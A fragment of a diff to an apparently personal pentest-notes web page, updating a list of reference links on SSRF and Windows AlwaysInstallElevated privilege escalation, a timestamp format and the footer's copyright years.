-<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/:" target="_blank" rel="noopener">https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/:</a> AlwaysInstallElevated Tested</li>
+<li><a href="https://blog.sqreen.com/ssrf-explained/" target="_blank" rel="noopener">https://blog.sqreen.com/ssrf-explained/</a>: SSRF Explained</li>
+<li><a href="https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf" target="_blank" rel="noopener">https://cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf</a>: More SSRF stuff including a cheatsheet.</li>
+<li><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/" target="_blank" rel="noopener">https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/</a>: AlwaysInstallElevated Tested</li>
 </ul>
 
             </div>
@@ -659,7 +659,7 @@ run
 
         
     <div class="updated-badge-container">
-        <span title="Updated @ 2021-08-07 22:20:37 EEST" style="cursor:help">
+        <span title="Updated @ 2021-08-07 22:20:37 &#43;03" style="cursor:help">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2021-08-07</text><text x="915" y="140" textLength="650" transform="scale(.1)">2021-08-07</text></g></svg>
         </span></div>
@@ -813,7 +813,7 @@ run
             
     <footer id="footer" class="footer">
         <div class="footer-inner">
-            <div class="site-info">©&nbsp;2021–2021&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
+            <div class="site-info">©&nbsp;2021–2023&nbsp;<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon footer-icon"><path d="M462.3 62.6C407.5 15.9 326 24.3 275.7 76.2L256 96.5l-19.7-20.3C186.1 24.3 104.5 15.9 49.7 62.6c-62.8 53.6-66.1 149.8-9.9 207.9l193.5 199.8c12.5 12.9 32.8 12.9 45.3 0l193.5-199.8c56.3-58.1 53-154.3-9.8-207.9z"/></svg>&nbsp;Doomdesire</div><div class="site-copyright"></div>
 
             
     
